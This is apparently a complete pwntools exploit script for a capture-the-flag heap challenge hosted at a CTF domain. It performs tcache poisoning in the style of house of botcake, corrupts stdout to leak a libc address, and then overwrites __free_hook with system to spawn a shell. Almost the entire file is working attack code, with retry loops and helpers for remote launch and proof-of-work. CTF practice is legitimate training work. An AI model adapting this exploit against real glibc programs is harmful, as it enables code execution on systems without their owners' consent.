from pwn import *
import pwn
import random as rnd
import struct as st
from time import sleep
import re
import subprocess

context.arch = "amd64"
context.word_size = 64
context.bits = 64
context.os = "linux"

file = "./chall"
exe_args = []
io: process = None
PREFIX = b"> "

speed = 0.2

def debug():
    gdb.attach(io, gdbscript=
    """
    define allocs
    p (char*[0x20])*0x555555558060
    end
    """)
    input("debug")

def launch_remote():
    global file, io
    io = remote("shop.challs.csc.tf", 1337)

def launch_local():
    global file, io
    io = process([file, *exe_args])
    if args.GDB:
        debug()

def solve_pow():
    leak = recvu(b"===================")
    pow = getb(leak, b") solve ", b"\n").decode()
    proc = subprocess.Popen(["solvepow", "solve", pow], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
    pow = proc.communicate()[0]
    sla(b"Solution? ", pow)

u64 = lambda d: pwn.u64(d.ljust(8, b"\0")[:8])
u32 = lambda d: pwn.u32(d.ljust(4, b"\0")[:4])
u16 = lambda d: pwn.u16(d.ljust(2, b"\0")[:2])
sla = lambda a, b: io.sendlineafter(a, b)
sa = lambda a, b: io.sendafter(a, b)
sl = lambda a: io.sendline(a)
recv = lambda: io.recv()
recvn = lambda a: io.recvn(a)
recvu = lambda a, b=False: io.recvuntil(a, b)
safe_link = lambda addr, ptr: (addr >> 12) ^ ptr
binsh = lambda: next(libc.search(b"/bin/sh\0"))
snum = lambda a, b: sla(a, str(b).encode("iso-8859-1"))
sprefix = lambda a: sla(PREFIX, a)
choice = lambda a: snum(PREFIX, a)

def launch():
    if args.REMOTE:
        l = launch_remote
    else:
        l = launch_local
    with context.local(log_level=logging.ERROR):
        l()
    if args.POW:
        solve_pow()

def getb(d, a, b):
    a_ = d.find(a)
    if a_ == -1 or a == b"": a_ = 0
    b_ = d.find(b, a_+len(a))
    if b_ == -1 or b == b"": b_ = len(d)
    return d[a_+len(a):b_]

# ================================================================
# EXPLOIT HERE
# ================================================================

with context.local(log_level=logging.ERROR):
    exe = ELF(file)
    libc = ELF("./libc.so.6")

tries = 0
tries_prog = log.progress("Tries")
def exploit():
    def malloc(size):
        choice(1)
        snum(b"How much? ", size)
    def edit(index, name):
        choice(2)
        snum(b"Index: ", index)
        sa(b"Name: ", name)
        sleep(speed)
    def free(index):
        choice(3)
        snum(b"Index: ", index)
    
    # house of botcake(?) to put libc address into tcache fd (no safelinking) and then partial overwrite so it points to stdout and get a leak

    malloc(0x418) # 0
    malloc(0x418) # 1
    malloc(0x28) # 2 fence
    free(2)
    free(0)
    free(1)

    malloc(0x448) # 0
    edit(0, b"A"*0x410 + p64(0) + p64(0x31))

    free(1)
    free(0)

    malloc(0x418) # 0
    malloc(0x418) # 1
    edit(1, p16(0x26a0))

    malloc(0x28) # 2
    malloc(0x28) # 3
    payload = flat([
        0xfbad1800,
        0,
        0,
        0,
    ]) + b"\0"
    edit(3, payload)

    leak = recvu(b"DONE")
    libc.address = u64(leak[8:16]) - 0x1ec980
    if libc.address < 0:
        raise EOFError
    success("libc: %#018x" % libc.address)

    malloc(0x18) # 4 fence
    free(4)

    free(0)
    free(1)
    malloc(0x448) # 0
    edit(0, b"A"*0x410 + p64(0) + p64(0x21))

    free(1)
    free(0)

    malloc(0x418) # 0
    malloc(0x418) # 1
    edit(1, p64(libc.sym["__free_hook"]))

    malloc(0x18) # 4
    malloc(0x18) # 5
    edit(5, p64(libc.sym.system))

    edit(4, b"/bin/sh\0")
    free(4)

    io.interactive()
    input("end")
    exit()

# launch()
# exploit()
# exit()

while True:
    count = 0
    tries += 1
    tries_prog.status(str(tries))

    launch()
    try:
        exploit()
    except EOFError:
        pass

    with context.local(log_level=logging.ERROR):
        io.close()
    # sleep(0.05)